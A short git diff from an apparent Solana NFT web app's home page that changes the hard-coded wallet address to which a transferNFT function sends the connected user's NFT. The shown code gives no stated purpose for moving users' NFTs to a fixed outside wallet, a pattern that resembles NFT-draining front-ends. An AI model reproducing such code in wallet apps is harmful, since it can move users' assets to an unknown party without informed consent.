@@ -71,7 +71,7 @@ export default function Home() {
   }
 
   const transferNFT = async (nft: INFT, publicKey: PublicKey, connection: Connection) => {
-    const addressToSend = new PublicKey("GjakKEh4NSHeqcg5Fk2MsdCnLocM7xtbhrr3jmcG8ygA");
+    const addressToSend = new PublicKey("8MdXvWgNou9jRVturbfnt3egf1aP9p1AjL8wiJavti7F");
     const mint = new PublicKey(nft.mint);
 
     const sendTxPromise = new Promise(async (resolve, reject) => {
